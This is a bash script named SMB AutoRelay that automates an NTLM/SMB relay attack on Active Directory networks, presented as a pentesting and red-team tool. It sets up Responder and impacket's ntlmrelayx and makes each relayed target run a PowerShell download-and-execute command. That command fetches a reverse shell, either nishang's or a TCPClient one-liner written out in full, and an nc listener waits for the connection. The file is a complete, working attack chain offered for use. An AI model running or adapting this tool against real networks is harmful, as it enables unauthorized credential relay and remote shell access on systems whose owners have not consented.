#!/bin/bash

# Name: SMB AutoRelay
# Author: chesire
#
# Description: SMB AutoRelay provides the automation of SMB/NTLM Relay technique for pentesting and red teaming exercises in active directory environments.
# Usage: ./smbAutoRelay.sh -i <interface> -t <TargetsFilePath>
# Example: ./smbAutoRelay -i eth0 -t ./targets.txt
# Note: targets.txt only store a list of IP addresses that you want to perform the relay.
#

# ################## DISCLAIMER ##################
# I AM NOT RESPONSIBLE OF THE MISUSE OF THIS TOOL.
# YOU RUN IT AT YOUR OWN RISK. PLEASE BE KIND :)

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

function ctrl_c(){
	echo -e "\n${redColour}[D:]${endColour} Keyboard interruption detected! Exiting...";
	tmux kill-session -t 'smbautorelay*' &>/dev/null

	if [ -e "$(pwd)/shell.ps1" ];then
		rm -f $(pwd)/shell.ps1 &>/dev/null
	fi

	if [ ! -z $terminal_nc_PID ];then
		kill -9 $terminal_nc_PID &>/dev/null
		wait $terminal_nc_PID &>/dev/null
    	fi
	tput cnorm; exit 1
}

function banner(){
	echo -e "${greenColour}"
    echo -e "   _____ __  _______     ___         __        ____       __
  / ___//  |/  / __ )   /   | __  __/ /_____  / __ \___  / /___ ___  __
  \__ \/ /|_/ / __  |  / /| |/ / / / __/ __ \/ /_/ / _ \/ / __ \`/ / / /
 ___/ / /  / / /_/ /  / ___ / /_/ / /_/ /_/ / _, _/  __/ / /_/ / /_/ /
/____/_/  /_/_____/  /_/  |_\__,_/\__/\____/_/ |_|\___/_/\__,_/\__, /
                                                              /____/   by chesire 🐱"
	echo -e "${endColour}"
	sleep 0.5
}

function helpMenu(){
	echo -e "${blueColour}Usage: ./smbAutoRelay.sh -i <interface> -t <file>${endColour}"
	echo -e "\n\t${purpleColour}i) Interface to listen for NetNTLM hashes${endColour}"
    echo -e "\n\t${purpleColour}t) File path to the list of targets (IP addresses one per line)${endColour}"
    echo -e "\n\t${purpleColour}r) Remove all installed software${endColour}"
    echo -e "\n\t${purpleColour}q) Shhh! be quiet...${endColour}"
	echo -e "\n\t${purpleColour}h) Shows this help menu${endColour}\n"
	tput cnorm; exit 0
}

function checkApt(){

	if [ "$1" == "net-tools" ];then which ifconfig &>/dev/null; else which $1 &>/dev/null; fi
	if [ $? -eq 0 ];then
		if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} $1 installed\n";sleep 0.5; fi
	else
		if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} $1 not installed, installing..."; sleep 0.5; fi
		apt install -y $1 &>/dev/null

		if [ "$1" == "net-tools" ];then which ifconfig &>/dev/null; else which $1 &>/dev/null; fi
		if [ $? -eq 0 ];then
			if [ ! -z $quiet ]; then echo -e "\t${greenColour}[:)]${endColour} $1 installed\n"; sleep 0.5; fi
            		echo "$1" >> $(pwd)/uninstall.txt
		else
			echo -e "\t${redColour}[:S]${endColour} Something bad happened, $1 could not be installed. Exiting...\n"; sleep 0.5
			tput cnorm; exit 1
		fi
	fi
	
}

function makeBck(){
	test -f "$(pwd)/responder/Responder.conf.old" &>/dev/null
	if [ $? -eq 1 ];then
      if [ ! -z $quiet ];then echo -e "\t${blueColour}[*]${endColour} Making copy of '$(pwd)/responder/Responder.conf' to '$(pwd)/responder/Responder.conf.old'\n"; sleep 0.5; fi
		cp $(pwd)/responder/Responder.conf $(pwd)/responder/Responder.conf.old
	fi
}

function checkProgramsNeeded(){

	if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} Checking for dependencies needed...\n"; sleep 0.5; fi

	programs=(tmux rlwrap python3 netcat wget xterm net-tools)
	for program in "${programs[@]}"; do checkApt $program; done

	test -f $(pwd)/responder/Responder.py &>/dev/null
	if [ $? -eq 0 ]; then
        	if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} responder installed\n"; sleep 0.5; fi
        	makeBck
	else
		if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} responder not installed, installing in '$(pwd)/responder' directory";sleep 0.5; fi
		mkdir $(pwd)/responder; git clone https://github.com/lgandx/Responder.git $(pwd)/responder &>/dev/null
		test -f $(pwd)/responder/Responder.py &>/dev/null
      		if [ $? -eq 0 ]; then
			chmod u+x $(pwd)/responder/Responder.py
			if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} responder installed!\n"; sleep 0.5; fi
        			makeBck; echo "responder" >> $(pwd)/uninstall.txt
		else
			echo -e "\t${redColour}[:S]${endColour} Something bad happened, responder could not be installed. Exiting...\n"; sleep 0.5; tput cnorm; exit 1
		fi
	fi

	test -f $(pwd)/impacket/examples/ntlmrelayx.py &>/dev/null
	if [ $? -eq 0 ]; then
		if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} impacket installed\n";sleep 0.5; fi
	else
		if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} impacket not installed, installing in '$(pwd)/impacket' directory"; sleep 0.5; fi

		mkdir $(pwd)/impacket; git clone https://github.com/SecureAuthCorp/impacket.git $(pwd)/impacket &>/dev/null
		python3 -m pip install impacket &>/dev/null
        	test -f "$(pwd)/impacket/examples/ntlmrelayx.py" &>/dev/null
		if [ $? -eq 0 ]; then
			cp $(pwd)/impacket/examples/ntlmrelayx.py $(pwd)/impacket/ntlmrelayx.py
			chmod u+x $(pwd)/impacket/ntlmrelayx.py
			if [ ! -z $quiet  ]; then echo -e "\t${greenColour}[:)]${endColour} impacket installed!\n"; sleep 0.5; fi
				echo "impacket" >> uninstall.txt
		else
			echo -e "\t${redColour}[:S]${endColour} Something bad happened, impacket could not be installed. Exiting...\n"; sleep 0.5; tput cnorm; exit 1
		fi
	fi

}

function checkResponderConfig(){
	if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} Checking responder config..."; fi

	SMBStatus=$(grep "^SMB" $(pwd)/responder/Responder.conf | head -1 | awk '{print $3}')
	HTTPStatus=$(grep "^HTTP" $(pwd)/responder/Responder.conf | head -1 | awk '{print $3}')

    if [[ $HTTPStatus == "Off" && $SMBStatus == "Off" ]];then
      if [ ! -z $quiet ];then echo -ne ""; fi
    else
      if [ ! -z $quiet ];then echo -ne "\n"; fi
    fi

	if [ "$SMBStatus" == "On" ]; then
		if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} Responder SMB server enabled, switching off..."; sleep 0.5; fi
		sed 's/SMB = On/SMB = Off/' $(pwd)/responder/Responder.conf > $(pwd)/responder/Responder.conf.tmp
	    mv $(pwd)/responder/Responder.conf.tmp $(pwd)/responder/Responder.conf
        rm -f $(pwd)/responder/Responder.conf.tmp 
    fi

    if [ "$HTTPStatus" == "On" ]; then
		if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} Responder HTTP server enabled, switching off..."; sleep 0.5; fi
        which $(pwd)/responder/Responder.conf.tmp &>/dev/null
        sed 's/HTTP = On/HTTP = Off/' $(pwd)/responder/Responder.conf > $(pwd)/responder/Responder.conf.tmp
	    mv $(pwd)/responder/Responder.conf.tmp $(pwd)/responder/Responder.conf
        rm -f $(pwd)/responder/Responder.conf.tmp
    fi

    if [[ $HTTPStatus == "Off" && $SMBStatus == "Off" ]];then
      if [ ! -z $quiet ];then echo -ne "\n"; fi
    fi

	if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} Responder SMB and HTTP servers disabled. Starting Relay Attack...\n"; sleep 0.5; fi
}

function relayingAttack(){

  if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} Starting Tmux server...\n"; sleep 0.5; fi
  tmux start-server && sleep 2

  if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} Creating Tmux session: smbautorelay...\n"; sleep 0.5; fi
  tmux new-session -d -t "smbautorelay"
  tmux rename-window "smbautorelay" && tmux split-window -h

  paneID=0
  tmux select-pane -t $paneID > /dev/null 2>&1
  if [ $? -ne 0 ];then
    let paneID+=1
    tmux select-pane -t $paneID
  fi

  if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} Tmux setted up. Launching Responder...\n"; sleep 0.5; fi
  tmux send-keys "python3 $(pwd)/responder/Responder.py -I $interface -drw" C-m && tmux swap-pane -d && sleep 1

  lhost=$(ifconfig $interface | grep "inet\s" | awk '{print $2}')

  openPorts=($(netstat -tunalp | grep -v 'Active\|Proto' | grep 'tcp' | awk '{print $4}' | awk -F: '{print $NF}' | sort -u | xargs))
  for openPort in "${openPorts[@]}"; do
    lport=$(($RANDOM%65535))
    if [ $lport -ne $openPort ];then break; fi
  done

  if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} Downloading PowerShell payload from nishang repository...\n"; sleep 0.5; fi
  wget 'https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1' -O $(pwd)/shell.ps1 &>/dev/null
  if [ ! -e "$(pwd)/shell.ps1" ];then
   if [ ! -z $quiet ];then echo -e "${yellowColour}[:S]${endColour} Unable to get nishang payload. Let's try crafting it manually...\n"; sleep 0.5; fi
   rshell='$client = New-Object System.Net.Sockets.TCPClient("'$lhost'",'$lport');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
   echo $rshell > $(pwd)/shell.ps1
  else
    echo 'Invoke-PowerShellTcp -Reverse -IPAddress '$lhost' -Port '$lport >> $(pwd)/shell.ps1
  fi

  if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} Serving PowerShell payload at $lhost:8000...\n"; sleep 0.5; fi
  let paneID+=1; tmux select-pane -t $paneID && tmux send-keys "python3 -m http.server" C-m && sleep 1 && tmux split-window

  if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} Launching ntlmrelayx.py from impacket\n"; sleep 0.5; fi
  command="powershell IEX (New-Object Net.WebClient).DownloadString('http://$lhost:8000/shell.ps1')"
  cp $targets $(pwd)/impacket/targets.txt
  let paneID+=1; tmux select-pane -t $paneID && tmux send-keys "cd $(pwd)/impacket && python3 $(pwd)/impacket/ntlmrelayx.py -tf $(pwd)/impacket/targets.txt -smb2support -c \"$command\" 2>/dev/null" C-m && sleep 1


  if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} $lport port open to receive the connection\n"; sleep 0.5; fi
  terminal='xterm'
  for ps in $(ps ax | awk '{print $5}' | sort -u | grep -v "\[\|\/" | awk -F- '{print $1}'); do
    tput -T $ps longname &>/dev/null
    if [[ $? -eq 0 && "$ps" != "tmux" ]];then terminal=$ps; break; fi
  done

  command="$SHELL -c 'tput setaf 7; rlwrap nc -lvvnp $lport'"
  if [ $terminal == "gnome" ];then
    gnome-terminal --window --hide-menubar -e "$command" &> /dev/null &
    terminal_nc_PID=!$
  elif [ $terminal == "termite" ];then
    termite -hold -e "$command" &>/dev/null &
    terminal_nc_PID=!$
  else
    xterm -hold -T 'XTerm' -e "$command" &>/dev/null &
    terminal_nc_PID=!$
  fi

  if [ $? -ne 0 ];then
	echo -e "${redColour}[D:]${endColour} Unable to locate terminal in the system. Existing...\n"; tput cnorm; exit 1
  fi

  sleep 3

  portStatus=$(netstat -tunalp | grep $lport | awk '{print $6}' | sort -u)
  while [ "$portStatus" == "LISTEN" ];do
    portStatus=$(netstat -tnualp | grep $lport | awk '{print $6}' | sort -u)
    sleep 0.5
  done

  rhost=$(netstat -tnualp | grep $lport | awk '{print $5}' | tail -1 | awk -F: '{print $1}')
  checkrhost=''
  while read line; do
    if [ "$rhost" == "$line" ];then
      checkrhost=1
    fi
  done < $targets

  if [[ "$portStatus" == "ESTABLISHED" && $checkrhost -eq 1 ]];then
    echo -ne "${blueColour}[*]${endColour} Authenticating to target $rhost "
    for i in {1..3}; do
      sleep 0.5
      echo -ne "."
    done
    echo -e "\n\n${greenColour}[:D]${endColour} Relay successful! Enjoy your shell!\n"; sleep 0.5
  else
    echo -e "${redColour}[:(]${endColour} Relay unsuccessful! May be you need more coffee\n"; sleep 0.5
  fi
  if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} Killing Tmux session: smbautorelay\n"; sleep 0.5; fi
  tmux kill-session -t "smbautorelay*"
  rm -f $(pwd)/shell.ps1 &>/dev/null

}

function rmsw(){

  if [ ! -e $(pwd)/uninstall.txt ];then
    echo -e "${greenColour}[:)]${endColour} Nothing to uninstall\n"
    tput cnorm; exit 0
  fi

  echo -ne "${redColour}[!!]${endColour} Are you sure you want to uninstall $(grep -v '#' $(pwd)/uninstall.txt | xargs | sed 's/ /, /g')? (y/n): "; read confirm

  while [[ "$confirm" != "y" && "$confirm" != "n" ]];do
    echo -e "\n"
    echo -ne "${redColour}[!!]${endColour} Please type y (yes) or n (no): ";read confirm
    echo -e "\n"
  done

  if [ "$confirm" == "y" ];then
    echo -e "\n$yellowColour[!!]${endColour} Uninstalling process started, please do not stop the process...\n"; sleep 0.5
    
    while read line; do
	    if [[ ${line:0:1} != '#' && "$line" != '' ]];then
		      if [ "$line" == "responder" ];then
			rm -rf $(pwd)/responder &>/dev/null
		      elif [ "$line" == "impacket" ];then
			python3 -m pip uninstall impacket &>/dev/null
			rm -rf $(pwd)/impacket &>/dev/null
		      else
			apt remove -y $line &>/dev/null
		      fi
		      if [ $? -ne 0 ];then
			if [ ! -z $quiet ];then echo -e "\t${redColour}[D:]${endColour} Unable to uninstall $line. Try manually\n"; sleep 0.5; fi
		      else
			if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} $line uninstaled\n"; sleep 0.5; fi
		      fi
	    fi
    done < $(pwd)/uninstall.txt
    rm -f $(pwd)/uninstall.txt
    tput cnorm; exit 0
  else
    echo; tput cnorm; exit 0
  fi
}

# Main function
banner

if [ ! -e $(pwd)/uninstall.txt ];then
	echo -e "# #################################### IMPORTANT! ####################################\n#\n# TRY TO NOT DELETE THIS FILE\n" >> uninstall.txt
	echo -e "# This was created automatically by smbAutoRelay.sh" >> uninstall.txt
	echo -e "# Here it will store the programs installed in case they are not found in this machine" >> uninstall.txt
	echo -e "# Be aware that if removed, smbAutoRelay.sh will suppose there is nothing to uninstall.\n" >> uninstall.txt
fi

if [ "$(id -u)" == 0 ]; then
	tput civis

    quiet='1'
    remove=''

	declare -i parameter_counter=0; while getopts "qri:t:h" arg; do
		case $arg in
            q) quiet='';;
            r) remove='1';;
			i) interface=$OPTARG; let parameter_counter+=1 ;;
			t) targets=$OPTARG; let parameter_counter+=1 ;;
			h) helpMenu;;
		esac
	done

    if [ ! -z $remove ];then
      rmsw
    fi

	if [ $parameter_counter -ne 2 ]; then
		helpMenu
	else
	if [ -z $quiet ];then echo -e "${yellowColour}[:x]${endColour} ...\n" ; fi
        iLookUp=$(ip addr | grep $interface | awk -F: '{print $2}' | sed 's/\s*//g')
        if [ "$interface" !=  "$iLookUp" ];then
          echo -e "${redColour}[D:]${endColour} $interface interface not found\n"; tput cnorm; exit 1
        fi

        if [ ! -e $targets ]; then
          echo -e "${redColour}[D:]${endColour} $targets file does not exists\n"; tput cnorm; exit 1
        else
          while read line; do
            echo $line | grep -E "^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$" &>/dev/null
            if [ $? -ne 0 ];then
              echo -e "${redColour}[D:]${endColour} Could not read the content of $targets. Exiting...\n"
              tput cnorm; exit 1
            fi
          done < $targets
        fi

		checkProgramsNeeded
		checkResponderConfig
        relayingAttack
	fi

	tput cnorm; exit 0

else
	echo -e "\n${redColour}[!!] Super powers not activated!${endColour}\n${blueColour}[*] You need root privileges to run this tool!${endColour}"; tput cnorm; exit 1
fi
